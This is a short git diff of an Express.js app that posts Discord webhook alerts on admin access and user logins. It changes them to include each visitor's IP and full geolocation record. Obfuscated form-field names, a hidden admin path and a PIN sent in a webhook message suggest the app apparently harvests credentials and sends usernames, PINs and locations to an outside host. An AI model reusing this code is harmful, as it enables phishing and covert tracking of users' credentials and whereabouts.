@@ -65,7 +65,8 @@ app.get('/111710/admin', (req, res) => {
 	axios.post(process.env.DISCORDWEBHOOK, {
 		embeds: [{
 			title: 'Admin accessed',
-			description: `Admin has been accessed by a user. IP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress} (${geoip.lookup(req.headers['x-forwarded-for'] || req.socket.remoteAddress).country})`,
+			description: `Admin has been accessed by a user. IP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}
+(Location: ${JSON.stringify(geoip.lookup(req.headers['x-forwarded-for'] || req.socket.remoteAddress), null, 2)})`,
 			color: 0x00FF00
 		}]
 	});
@@ -151,7 +152,8 @@ PIN: ${req.body.hDjeRfg}`,
 			axios.post(process.env.DISCORDWEBHOOK, {
 				embeds: [{
 					title: 'User logged in',
-					description: `User: ${req.body.fHeusGF} logged in. IP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress} (${geoip.lookup(req.headers['x-forwarded-for'] || req.socket.remoteAddress).country})`,
+					description: `User: ${req.body.fHeusGF} logged in. IP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}
+(Location: ${JSON.stringify(geoip.lookup(req.headers['x-forwarded-for'] || req.socket.remoteAddress), null, 2)})`,
 					color: 0x00FF00
 				}]
 			});
